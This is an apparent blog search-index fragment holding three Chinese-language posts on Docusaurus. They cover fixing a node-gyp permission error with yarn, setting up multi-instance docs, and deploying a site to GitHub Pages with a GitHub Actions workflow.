        <content type="html"><![CDATA[<h2 id="gyp-ERR-stack-Error-EACCES"><a href="#gyp-ERR-stack-Error-EACCES" class="headerlink" title="gyp ERR! stack Error: EACCES"></a>gyp ERR! stack Error: EACCES</h2><ul><li>参考<a href="https://stackoverflow.com/questions/52231289/gyp-err-stack-error-eacces-permission-denied-mkdir-var-www-project-name-no">这篇文章</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">apt install python3 </span><span class="line"></br></span><span class="line">npm install yarn -g</span><span class="line">ln -s <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/node-v14.17.1-linux-x64/</span>bin<span class="hljs-regexp">/yarn /u</span>sr<span class="hljs-regexp">/local/</span>bin/yarn</span><span class="line">ln -s <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/node-v14.17.1-linux-x64/</span>bin<span class="hljs-regexp">/yarnpkg /u</span>sr<span class="hljs-regexp">/local/</span>bin/yarnpkg</span><span class="line"></br></span><span class="line">yarn</span></code></pre></div></div><p>尽量使用<code>yarn</code>作为包管理。</p>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus 的多实例文档部署</title>
      <link href="/2021/06/23/docu-%E7%9A%84%E5%A4%9A%E5%AE%9E%E4%BE%8B%E6%96%87%E6%A1%A3/"/>
      <url>/2021/06/23/docu-%E7%9A%84%E5%A4%9A%E5%AE%9E%E4%BE%8B%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>要实现多实例文档部署其实非常简单，按照<a href="https://docusaurus.io/zh-CN/docs/docs-multi-instance">官方文档</a>就可以操作。但是里面有一些坑需要回避。</p><p>有两种部署方式：</p><ol><li>在<code>doc</code>文件夹内部再添加文件夹，这种方式可以控制版本。</li><li>在根目录下添加文件夹，这种方式不能控制版本。</li></ol><p>本篇讲述第2种方式。第一种方式可以参考<a href="https://www.gitmemory.com/issue/facebook/docusaurus/3299/675409985">这篇文章</a>。</p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-asciidoc codeBlockLines"><span class="line">docs/</span><span class="line"><span class="hljs-bullet">- </span>doc1.md</span><span class="line">resources/</span><span class="line"><span class="hljs-bullet">- </span>doc2.md</span></code></pre></div></div><p>如上加入了<code>resources</code>文件夹，里面包含了<code>doc2.md</code>文件。</p><h2 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h2><p>在<code>docusaurus.config.js</code>文件中需要做出如下<strong>最小</strong>修改：</p><div class="codeBlockContainer"><div class="codeBlockTitle">title="docusaurus.config.js"</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.exports = &#123;</span><span class="line">  <span class="hljs-attr">plugins</span>: [</span><span class="line">    [</span><span class="line">      <span class="hljs-string">&#x27;@docusaurus/plugin-content-docs&#x27;</span>,</span><span class="line">      &#123;</span><span class="line">        <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">routeBasePath</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">sidebarPath</span>: <span class="hljs-built_in">require</span>.resolve(<span class="hljs-string">&#x27;./sidebarsResources.js&#x27;</span>),</span><span class="line">        <span class="hljs-comment">// ... 其他设置</span></span><span class="line">      &#125;,</span><span class="line">    ],</span><span class="line">  ],</span><span class="line">  <span class="hljs-attr">themeConfig</span>: &#123;</span><span class="line">    <span class="hljs-attr">navbar</span>: &#123;</span><span class="line">      <span class="hljs-attr">items</span>: [&#123;</span><span class="line">      &#123;</span><span class="line marked">        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;/resources/doc2&#x27;</span>,   <span class="hljs-comment">// 这里要指定具体的index文档</span></span><span class="line">        <span class="hljs-attr">activeBasePath</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">label</span>: <span class="hljs-string">&#x27;这里是文档2&#x27;</span>,</span><span class="line">        <span class="hljs-attr">position</span>: <span class="hljs-string">&#x27;left&#x27;</span></span><span class="line">      &#125;,</span><span class="line">      &#125;]</span><span class="line">    &#125;</span><span class="line">  &#125;</span><span class="line">&#125;;</span></code></pre></div></div><p>最后是对sidebars的调整</p><div class="codeBlockContainer"><div class="codeBlockTitle">title='./sidebarsResources.js'</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.exports = &#123;</span><span class="line">    <span class="hljs-attr">resources</span>: [&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;autogenerated&#x27;</span>, <span class="hljs-attr">dirName</span>: <span class="hljs-string">&#x27;.&#x27;</span> &#125;],</span><span class="line">&#125;</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Github Pages 部署 Blog</title>
      <link href="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>要使用 Github Pages 来部署博客，首先需要选择使用什么静态框架。</p><p>这里我最终选择了<a href="https://docusaurus.io/zh-CN/docs">Docusaurus</a></p><p>开发与部署的简要流程如下：</p><ol><li><p>使用<code>Docusaurus</code>的脚手架创建初始项目</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-swift codeBlockLines"><span class="line">npx <span class="hljs-meta">@docusaurus</span><span class="hljs-operator">/</span><span class="hljs-keyword">init</span><span class="hljs-meta">@latest</span> <span class="hljs-keyword">init</span> my<span class="hljs-operator">-</span>website classic</span></code></pre></div></div></li><li><p>修改<code>docusaurus.config.js</code>文件中3个重要内容</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line">url: <span class="hljs-string">&#x27;https://elinpf.github.io&#x27;</span>,</span><span class="line"><span class="hljs-attr">organizationName</span>: <span class="hljs-string">&#x27;Elinpf&#x27;</span>, </span><span class="line"><span class="hljs-attr">projectName</span>: <span class="hljs-string">&#x27;elinpf.github.io&#x27;</span>, </span></code></pre></div></div><ol start="3"><li><p>在Github上创建同名仓库<code>Elinpf/Elinpf.github.io</code></p></li><li><p>发布<code>master</code>和<code>gh-pages</code>分支</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">git remote add origin https://github.com/Elinpf/Elinpf.github.io.git</span><span class="line">git push origin master</span><span class="line">git branch -M gh-pages</span><span class="line">git push origin gh-pages</span></code></pre></div></div><ol start="5"><li>将<code>Setting</code>中的Pages发布源改为<code>gh-pages</code>分支</li></ol><p><img src="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/1.png"></p><ol start="6"><li>将<code>Setting</code>中的<code>Secrets</code>添加一个<code>ACCESS_TOKEN</code>(这里的token就是用户授权的token值，<a href="https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">参考这里增加新的授权</a>)</li></ol><p><img src="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/2.png"></p><ol start="7"><li>在项目中添加文件<code>.github/workflows/docusaurus.yml</code>，来写Action用于自动部署（具体含义参考<a href="http://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html">这篇文章</a>）</li></ol><div class="codeBlockContainer"><div class="codeBlockTitle">title=".github/workflows/docusaurus.yml"</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">Github</span> <span class="hljs-string">pages</span></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">build-and-deploy:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">persist-credentials:</span> <span class="hljs-literal">false</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">and</span> <span class="hljs-string">Build</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        npm install</span></span><span class="line"><span class="hljs-string">        npm run-script build </span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@releases/v3</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">ACCESS_TOKEN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.ACCESS_TOKEN</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">        <span class="hljs-attr">BRANCH:</span> <span class="hljs-string">gh-pages</span></span><span class="line">        <span class="hljs-attr">FOLDER:</span> <span class="hljs-string">build</span></span><span class="line">        <span class="hljs-attr">BUILD_SCRIPT:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">npm</span> <span class="hljs-string">run</span> <span class="hljs-string">build</span></span></code></pre></div></div><ol start="8"><li>再次提交就可以了</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
